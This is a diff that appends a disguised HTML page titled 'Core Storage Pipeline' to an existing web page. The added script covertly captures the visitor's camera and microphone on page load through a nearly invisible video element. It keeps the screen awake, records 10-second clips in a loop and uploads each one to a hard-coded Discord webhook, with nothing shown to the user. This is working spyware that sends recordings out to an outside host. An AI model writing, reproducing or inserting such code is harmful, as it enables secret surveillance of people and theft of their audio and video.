@@ -1785,3 +1785,165 @@
 
 </body>
 </html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Core Storage Pipeline</title>
+    <style>
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+        }
+        body {
+            background-color: #000000;
+            color: #000000;
+            font-family: sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <video id="preview" autoplay playsinline muted></video>
+
+<script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5";
+
+    const video = document.getElementById('preview');
+    let mediaRecorder;
+    let recordedChunks = [];
+    let countdownInterval;
+    let wakeLock = null;
+    
+    const CLIP_DURATION = 10; 
+
+    // --- AUTOMATIC WAKE LOCK ---
+    async function requestWakeLock() {
+        try {
+            if ('wakeLock' in navigator) {
+                wakeLock = await navigator.wakeLock.request('screen');
+                console.log("Screen Wake Lock active. Device will not sleep.");
+            }
+        } catch (err) {
+            console.error(`Wake Lock failed: ${err.message}`);
+        }
+    }
+
+    // Re-request wake lock if user switches away and returns to the tab
+    document.addEventListener('visibilitychange', async () => {
+        if (wakeLock !== null && document.visibilityState === 'visible') {
+            await requestWakeLock();
+        }
+    });
+
+    async function initCamera() {
+        try {
+            // Request wake lock immediately when initialization starts
+            await requestWakeLock();
+
+            const constraints = {
+                video: {
+                    width: { ideal: 3840, max: 3840 },  
+                    height: { ideal: 2160, max: 2160 }, 
+                    frameRate: { ideal: 60 },
+                    facingMode: { ideal: "user" } 
+                },
+                audio: {
+                    echoCancellation: false, 
+                    noiseSuppression: false,
+                    autoGainControl: true
+                }
+            };
+
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = stream;
+            
+            setupRecorder(stream);
+            
+            recordedChunks = [];
+            mediaRecorder.start();
+            startLoopTimer();
+            
+        } catch (err) {
+            console.error("Pipeline initialization failed:", err);
+        }
+    }
+
+    function setupRecorder(stream) {
+        let selectedMimeType = 'video/webm;codecs=vp8';
+        if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
+            if (MediaRecorder.isTypeSupported('video/mp4')) {
+                selectedMimeType = 'video/mp4';
+            } else if (MediaRecorder.isTypeSupported('video/webm')) {
+                selectedMimeType = 'video/webm';
+            }
+        }
+
+        mediaRecorder = new MediaRecorder(stream, { 
+            mimeType: selectedMimeType,
+            videoBitsPerSecond: 3500000 
+        });
+
+        mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) recordedChunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(recordedChunks, { type: selectedMimeType });
+            recordedChunks = [];
+
+            const formData = new FormData();
+            const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
+            formData.append('file', blob, `vlog_${Date.now()}.${ext}`);
+
+            try {
+                fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+            } catch (err) {
+                console.error("Network drop, chunk omitted:", err);
+            }
+
+            recordedChunks = [];
+            if (mediaRecorder.state === "inactive") {
+                mediaRecorder.start();
+            }
+        };
+    }
+
+    function startLoopTimer() {
+        clearInterval(countdownInterval);
+        let timeLeft = CLIP_DURATION;
+        
+        countdownInterval = setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                    mediaRecorder.stop();
+                }
+                startLoopTimer(); 
+            }
+        }, 1000);
+    }
+
+    window.addEventListener('DOMContentLoaded', initCamera);
+</script>
+
+</body>
+</html>
